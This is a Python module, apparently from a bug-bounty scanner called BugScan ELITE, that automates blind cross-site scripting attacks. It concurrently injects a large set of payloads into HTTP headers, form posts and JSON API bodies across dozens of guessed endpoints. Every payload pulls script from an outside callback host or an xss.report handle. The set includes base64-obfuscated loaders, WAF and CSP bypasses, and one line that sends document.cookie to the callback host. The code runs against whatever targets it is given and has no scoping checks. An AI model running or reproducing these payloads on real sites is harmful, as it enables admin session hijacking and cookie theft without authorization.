"""
BugScan ELITE — Blind XSS Engine
Injects BXSS payloads into:
  - HTTP headers (User-Agent, Referer, X-Forwarded-For, X-Real-IP, etc.)
  - Form fields and POST parameters
  - Registration / login / feedback / support / search endpoints
  - JSON request bodies
  - Custom headers seen in real programs

Uses ezz.hak.monster as default callback, falls back to interactsh.
"""
import os, re, logging, urllib.request, urllib.parse, ssl, json, threading
from typing import List, Dict, Optional
from concurrent.futures import ThreadPoolExecutor, as_completed

log = logging.getLogger("elite.bxss")

def _ctx():
    c = ssl.create_default_context()
    c.check_hostname = False; c.verify_mode = ssl.CERT_NONE
    return c

def _req(url, method="GET", data=None, headers=None, timeout=8):
    try:
        hdrs = {"User-Agent": "Mozilla/5.0 (X11; Linux x86_64)", "Accept": "*/*"}
        if headers: hdrs.update(headers)
        body = None
        if data:
            if isinstance(data, dict):
                body = urllib.parse.urlencode(data).encode()
                hdrs.setdefault("Content-Type","application/x-www-form-urlencoded")
            elif isinstance(data, str):
                body = data.encode()
            else:
                body = data
        req = urllib.request.Request(url, data=body, headers=hdrs, method=method)
        with urllib.request.urlopen(req, timeout=timeout, context=_ctx()) as r:
            return r.status, dict(r.headers), r.read(32768).decode("utf-8","ignore")
    except: return None

# ── BXSS payload builder ───────────────────────────────────────────────────
def get_bxss_host() -> str:
    """Return configured BXSS callback host."""
    host = os.getenv("BXSS_HOST","ezz.hak.monster")
    return host.strip()

def get_xss_hunter() -> str:
    return os.getenv("XSS_HUNTER","themasterdoctor")

def build_bxss_payloads(host: str = None, hunter: str = None) -> List[str]:
    """
    Build the full BXSS payload set using user's configured domain.
    These are your personal polyglot payloads + WAF bypass variants.
    """
    h = host or get_bxss_host()    # ezz.hak.monster
    u = hunter or get_xss_hunter() # themasterdoctor

    return [
        # ── Simple script tag (most reliable) ─────────────────────────────
        f'"><script src=//ezz.hak.monster></script>',
        f'\'"><script src=//ezz.hak.monster></script>',

        # ── Your full polyglot (20+ cases) — RECOMMENDED ──────────────────
        f'JavaScript://%250A/*?\'/*\\\'/*"/*\\"/*`/*\\`/*%26apos;)/*<!-->'
        f'</Title/</Style/</Script/</textArea/</iFrame/</noScript>\\'
        f'74k<K/contentEditable/autoFocus/OnFocus=/*${{/*/;{{/**/'
        f'(import(/https:\\\\ezz.hak.monster?1=1/.source))}}//'
        f'\\76-->',

        # ── Short polyglot (HTML & JS main cases) ─────────────────────────
        f'\'/*\\\'/*"/*\\"/*</Script><Input/AutoFocus/OnFocus=/**/'
        f'(import(/https:\\\\ezz.hak.monster/.source))//> ',

        # ── Close common tags then inject ─────────────────────────────────
        f'--></tiTle></stYle></texTarea></scrIpt>"//' 
        f'\'//><scrIpt src=https://ezz.hak.monster></scrIpt>',

        # ── SVG onload ────────────────────────────────────────────────────
        f'"><svg/onload=import(\'//ezz.hak.monster\')>',

        # ── img onerror ───────────────────────────────────────────────────
        f'"><img/src/onerror=import(\'//ezz.hak.monster\')>',
        f'"><img src=x onerror=import(\'//ezz.hak.monster\')>',

        # ── input autofocus (your atob-based payload) ─────────────────────
        # base64: var a=document.createElement("script");a.src="https://ezz.hak.monster";document.body.appendChild(a);
        f'"><input onfocus=eval(atob(this.id)) '
        f'id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7'
        f'YS5zcmM9Imh0dHBzOi8vZXp6Lmhhay5tb25zdGVyIjtkb2N1bWVudC5ib2R5'
        f'LmFwcGVuZENoaWxkKGEpOw== autofocus>',

        # ── video source onerror ──────────────────────────────────────────
        f'"><video><source onerror=eval(atob(this.id)) '
        f'id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7'
        f'YS5zcmM9Imh0dHBzOi8vZXp6Lmhhay5tb25zdGVyIjtkb2N1bWVudC5ib2R5'
        f'LmFwcGVuZENoaWxkKGEpOw==>',

        # ── xss.report handle (your personal) ─────────────────────────────
        f'\'"><script src=https://xss.report/c/{u}></script>',
        f'--></tiTle></stYle></texTarea></scrIpt>"//'
        f'\'//><scrIpt src=https://xss.report/c/{u}></scrIpt>',

        # ── CSP bypass via youtube oembed ──────────────────────────────────
        f'<script src="https://www.youtube.com/oembed?callback=import'
        f'(\'https://ezz.hak.monster\');"></script>',

        # ── noscript/template close ────────────────────────────────────────
        f'/*\'/*`/*--></noscript></title></textarea></style>'
        f'</template></noembed></script>"//'
        f'\'//><scrIpt src="https://ezz.hak.monster"></scrIpt>',

        # ── JavaScript: eval ───────────────────────────────────────────────
        f'javascript:eval(\'var a=document.createElement(\\\'script\\\');'
        f'a.src=\\\'https://ezz.hak.monster\\\';'
        f'document.body.appendChild(a)\')',

        # ── mXSS ──────────────────────────────────────────────────────────
        f'\'"><textarea><style><img src=x alt="</style>'
        f'<svg/onload=import(\'//ezz.hak.monster\')">',

        # ── iframe srcdoc ─────────────────────────────────────────────────
        f'"><iframe srcdoc="&#60;&#115;&#99;&#114;&#105;&#112;&#116;&#62;'
        f'var a=parent.document.createElement(\'script\');'
        f'a.src=\'https://ezz.hak.monster\';'
        f'parent.document.body.appendChild(a);'
        f'&#60;&#47;&#115;&#99;&#114;&#105;&#112;&#116;&#62;">',

        # ── base href injection ────────────────────────────────────────────
        f'\'"><Script /Src=https://ezz.hak.monster></Script>',

        # ── ASP.NET WAF bypass (img with broken attrs) ─────────────────────
        f'<Img /helloooooo Src=OnCCCCCD on on onNONONOX '
        f'OnError=this.src=\'//ezz.hak.monster/?c=\'+document.cookie>',
    ]


# ── Headers to inject BXSS into ───────────────────────────────────────────
BXSS_HEADERS = [
    "User-Agent",
    "Referer",
    "X-Forwarded-For",
    "X-Real-IP",
    "X-Forwarded-Host",
    "X-Custom-Header",
    "X-Original-URL",
    "X-Rewrite-URL",
    "True-Client-IP",
    "CF-Connecting-IP",
    "X-Client-IP",
    "Forwarded",
    "Via",
    "X-WAP-Profile",
    "Contact",
    "X-Wap-Profile",
    "X-ATT-DeviceId",
    "X-Api-Key",
    "Origin",
    "Accept-Language",
    "Accept-Charset",
    "Cookie",
]

# ── Common BXSS sink parameters ───────────────────────────────────────────
BXSS_PARAMS = [
    "name","username","email","first_name","last_name","full_name",
    "message","comment","feedback","content","body","text","note","notes",
    "subject","title","description","bio","about","profile","address",
    "company","organization","phone","mobile","search","query","q",
    "keyword","tag","label","reason","report","ticket","issue","support",
    "reply","response","review","testimonial","signature","announcement",
    "news","post","blog","article","page","template",
]

# ── BXSS endpoint patterns to target ──────────────────────────────────────
BXSS_ENDPOINT_PATTERNS = [
    "/feedback","/contact","/support","/help","/report",
    "/register","/signup","/sign-up","/create-account","/join",
    "/profile","/settings","/account","/user","/preferences",
    "/login","/signin","/sign-in","/auth",
    "/comment","/review","/testimonial","/message","/submit",
    "/search","/find","/query",
    "/ticket","/issue","/bug","/request",
    "/api/user","/api/users","/api/profile","/api/feedback",
    "/api/comment","/api/register","/api/support",
    "/admin/users","/admin/feedback","/admin/reports",
    "/dashboard/users","/dashboard/settings",
]


def check_bxss_headers(targets: List[str]) -> List[dict]:
    """
    Inject BXSS payloads into HTTP headers.
    This hits every target with BXSS in User-Agent, Referer, X-Forwarded-For etc.
    """
    findings = []
    host = get_bxss_host()
    hunter = get_xss_hunter()
    payloads = build_bxss_payloads(host, hunter)

    # Use the 3 best payloads for header injection (keep it fast)
    header_payloads = [
        f'--></tiTle></stYle></texTarea></scrIpt>"//'
        f'\'//><scrIpt src=https://ezz.hak.monster></scrIpt>',
        f'"><script src=//ezz.hak.monster></script>',
        f'\'"><script src=https://xss.report/c/{hunter}></script>',
    ]

    log.info(f"[bxss] header injection on {len(targets[:30])} targets")

    def _inject_headers(url):
        results = []
        for payload in header_payloads:
            for header in BXSS_HEADERS[:8]:  # top 8 most effective
                try:
                    injected_headers = {
                        "User-Agent": "Mozilla/5.0 BugScanELITE",
                        "Referer":    url,
                        header:       payload,
                    }
                    r = _req(url, headers=injected_headers, timeout=6)
                    if r and r[0] < 500:
                        # Check if payload reflects (reflected = confirmed, not-reflected = blind)
                        reflected = any(p in r[2] for p in ["ezz.hak.monster","xss.report"])
                        sev = "high" if reflected else "medium"
                        desc = (f"BXSS payload injected into {header} header"
                                + (" — REFLECTED in response!" if reflected else
                                   f" — sent to {host} (check callback)"))
                        results.append({
                            "bug": "bxss",
                            "type": "bxss",
                            "severity": sev,
                            "url": url,
                            "title": desc,
                            "description": desc,
                            "param": header,
                            "payload": payload[:100],
                            "reflected": reflected,
                            "bxss_host": host,
                            "poc": (
                                f'curl -s "{url}" \\\n'
                                f'  -H "{header}: {payload[:60]}" \\\n'
                                f'  # Callback: https://{host}'
                            ),
                            "impact": (
                                "Blind XSS fires in admin panel when staff views logs/requests. "
                                "Leads to session hijack of admin account."
                            ),
                            "remediation": "Encode all user-supplied data before rendering in admin UI.",
                        })
                        if reflected:
                            return results  # confirmed - stop early
                except: pass
        return results

    with ThreadPoolExecutor(max_workers=5) as exe:
        futs = {exe.submit(_inject_headers, t): t for t in targets[:30]}
        for fut in as_completed(futs, timeout=60):
            try:
                res = fut.result()
                if res:
                    # Deduplicate: one finding per url per header
                    seen = set()
                    for f in res:
                        k = f"{f['url']}|{f['param']}"
                        if k not in seen:
                            seen.add(k)
                            findings.append(f)
                            break  # one per target
            except: pass

    log.info(f"[bxss] header injection done: {len(findings)} findings")
    return findings


def check_bxss_forms(endpoints: List[str], targets: List[str]) -> List[dict]:
    """
    Inject BXSS into form fields / POST parameters on registration,
    feedback, support, profile, and search endpoints.
    """
    findings = []
    host = get_bxss_host()
    hunter = get_xss_hunter()

    # Best payloads for form injection
    form_payloads = [
        f'"><script src=//ezz.hak.monster></script>',
        f'\'"><script src=https://xss.report/c/{hunter}></script>',
        f'--></tiTle></stYle></texTarea></scrIpt>"//'
        f'\'//><scrIpt src=https://ezz.hak.monster></scrIpt>',
        f'"><img/src/onerror=import(\'//ezz.hak.monster\')>',
        # Your atob autofocus payload
        f'"><input onfocus=eval(atob(this.id)) '
        f'id=dmFyIGE9ZG9jdW1lbnQuY3JlYXRlRWxlbWVudCgic2NyaXB0Iik7'
        f'YS5zcmM9Imh0dHBzOi8vZXp6Lmhhay5tb25zdGVyIjtkb2N1bWVudC5ib2R5'
        f'LmFwcGVuZENoaWxkKGEpOw== autofocus>',
    ]

    # Build target URLs to probe
    bxss_targets = set()
    for t in targets[:20]:
        base = t.rstrip("/")
        for path in BXSS_ENDPOINT_PATTERNS:
            bxss_targets.add(base + path)
    # Also include endpoints that match BXSS patterns
    for ep in endpoints[:500]:
        for pat in ["/feedback","/contact","/register","/signup","/profile",
                    "/support","/comment","/review","/submit","/message"]:
            if pat in ep.lower():
                bxss_targets.add(ep.split("?")[0])
                break

    log.info(f"[bxss] form injection on {len(bxss_targets)} endpoints")

    def _inject_form(url):
        results = []
        try:
            # Try POST with common BXSS params
            for payload in form_payloads[:2]:
                post_data = {p: payload for p in BXSS_PARAMS[:12]}
                # Also inject JSON
                json_data = json.dumps({p: payload for p in BXSS_PARAMS[:6]})

                # POST form-encoded
                r = _req(url, method="POST", data=post_data,
                         headers={"User-Agent": "BugScanELITE/5.0"}, timeout=7)
                if r and r[0] in (200,201,202,302,400,422):
                    reflected = any(x in r[2] for x in ["ezz.hak.monster","xss.report"])
                    desc = (f"BXSS in form POST — {'REFLECTED' if reflected else 'sent to '+host}"
                            f" (check callback)")
                    results.append({
                        "bug": "bxss",
                        "type": "bxss",
                        "severity": "high" if reflected else "medium",
                        "url": url,
                        "title": desc,
                        "description": desc,
                        "param": "POST body (name/email/message/feedback)",
                        "payload": payload[:100],
                        "reflected": reflected,
                        "bxss_host": host,
                        "poc": (
                            f'curl -s -X POST "{url}" \\\n'
                            f'  -d "name={payload[:40]}&email={payload[:40]}" \\\n'
                            f'  # Callback: https://{host}'
                        ),
                        "impact": (
                            "Blind XSS stored in backend — fires when admin "
                            "reviews submissions. Leads to admin session hijack."
                        ),
                        "remediation": "Output-encode all user input before rendering in admin UI.",
                    })
                    if results: break
        except: pass
        return results

    with ThreadPoolExecutor(max_workers=8) as exe:
        futs = {exe.submit(_inject_form, url): url for url in list(bxss_targets)[:100]}
        for fut in as_completed(futs, timeout=90):
            try:
                res = fut.result()
                if res:
                    findings.extend(res[:1])  # 1 per endpoint
            except: pass

    # Deduplicate
    seen = set()
    deduped = []
    for f in findings:
        k = f"{f['url']}|{f['param'][:30]}"
        if k not in seen:
            seen.add(k)
            deduped.append(f)

    log.info(f"[bxss] form injection done: {len(deduped)} findings")
    return deduped


def check_bxss_json(endpoints: List[str]) -> List[dict]:
    """
    Inject BXSS into JSON API endpoints.
    Targets /api/ routes with JSON bodies.
    """
    findings = []
    host = get_bxss_host()
    hunter = get_xss_hunter()

    payload = f'"><script src=//ezz.hak.monster></script>'

    api_endpoints = [ep for ep in endpoints if "/api/" in ep.lower()][:50]
    if not api_endpoints:
        return []

    log.info(f"[bxss] JSON injection on {len(api_endpoints)} API endpoints")

    for url in api_endpoints:
        try:
            json_body = json.dumps({
                "name":     payload,
                "username": payload,
                "email":    f"bxss@{host}",
                "message":  payload,
                "comment":  payload,
                "bio":      payload,
                "content":  payload,
            })
            r = _req(url, method="POST", data=json_body.encode(),
                     headers={"Content-Type": "application/json",
                               "User-Agent":   f'"><script src=//ezz.hak.monster></script>'},
                     timeout=7)
            if r and r[0] in (200,201,202,400,422):
                reflected = any(x in r[2] for x in ["ezz.hak.monster","xss.report"])
                if r[0] in (200,201,202) or reflected:
                    desc = f"BXSS in JSON API — {'REFLECTED' if reflected else 'sent to '+host}"
                    findings.append({
                        "bug":          "bxss",
                        "type":         "bxss",
                        "severity":     "high" if reflected else "medium",
                        "url":          url,
                        "title":        desc,
                        "description":  desc,
                        "param":        "JSON body (name/username/message)",
                        "payload":      payload[:80],
                        "bxss_host":    host,
                        "poc":          (
                            f'curl -s -X POST "{url}" \\\n'
                            f'  -H "Content-Type: application/json" \\\n'
                            f'  -d \'{{"name":"{payload[:40]}"}}\' \\\n'
                            f'  # Check: https://{host}'
                        ),
                        "impact":       "Blind XSS in API data storage — fires in admin dashboard.",
                        "remediation":  "Sanitize and encode all API input before display.",
                    })
        except: pass

    log.info(f"[bxss] JSON done: {len(findings)} findings")
    return findings[:10]


def generate_bxss_report(host: str = None) -> str:
    """Generate a summary of BXSS injection points to test manually."""
    h = host or get_bxss_host()
    u = get_xss_hunter()
    return f"""
=== BXSS Configuration ===
Callback Host : https://{h}
XSS Hunter    : https://xss.report/c/{u}

=== Most Effective Headers to Inject ===
User-Agent, Referer, X-Forwarded-For, X-Real-IP, X-Custom-Header

=== Your Polyglot (Full — 20+ cases) ===
JavaScript://%250A/*?'/*\\'/*"/*\\"/*`/*\\`/*%26apos;)/*<!--></Title/</Style/</Script/</textArea/</iFrame/</noScript>\\74k<K/contentEditable/autoFocus/OnFocus=/*${{/*/;{{/**/(import(/https:\\\\{h}?1=1/.source))}}//{chr(92)}76-->

=== Simple Reliable ===
"><script src=//{h}></script>

=== Atob Autofocus ===
"><input onfocus=eval(atob(this.id)) id=PAYLOAD_BASE64_HERE autofocus>
"""
